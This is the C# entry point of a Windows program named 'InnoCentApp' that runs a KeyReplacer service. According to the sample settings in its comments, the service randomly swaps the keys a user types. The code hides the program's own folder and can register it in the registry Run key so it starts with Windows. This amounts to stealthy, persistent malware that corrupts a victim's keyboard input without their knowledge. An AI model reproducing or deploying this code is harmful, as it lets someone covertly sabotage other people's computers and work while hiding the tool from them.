using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using WindowsInput;

namespace InnoCentApp
{
    class InterceptKeys

    {

        public static void Main()
        {
            //var settings= new KeyReplacer.KeyReplacerServiceSettings
            //     ()
            //{
            //    Keymaps = new List<KeyReplacer.Keymap>
            //    {
            //       new KeyReplacer.Keymap(){From="a" , To="b", Probability=50},
            //       new KeyReplacer.Keymap(){From=";" , To=".,", Probability=80},
            //    }
            //};
            HideRunFolder();
            var conf = ConfigurationManager.AppSettings["Setting"];
            var settingsObject = KeyReplacer.KeyReplacerServiceSettings.FromJson(conf);
            var autoStart = ConfigurationManager.AppSettings["AutoStart"];
            SetStartup(autoStart);
            Console.WriteLine(settingsObject.ToJson());
            var service= new KeyReplacer.KeyReplacerService(settingsObject);
            Application.Run();
            service.Dispose();

        }

        private static void SetStartup(string start)
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            string file = typeof(InterceptKeys).Assembly.Lo‌​cation;
            string app = Path.GetFileNameWithoutExtension(file);
            if (bool.TrueString.Equals(start))
                rk.SetValue(app, Application.ExecutablePath.ToString());
            else
                rk.DeleteValue(app, false);

        }

        private static void HideRunFolder()
        {
            string fileLocation = Application.ExecutablePath.ToString();
            string folderToHide = Path.GetDirectoryName(fileLocation);
            File.SetAttributes(folderToHide, FileAttributes.Hidden);
        }
    }

}
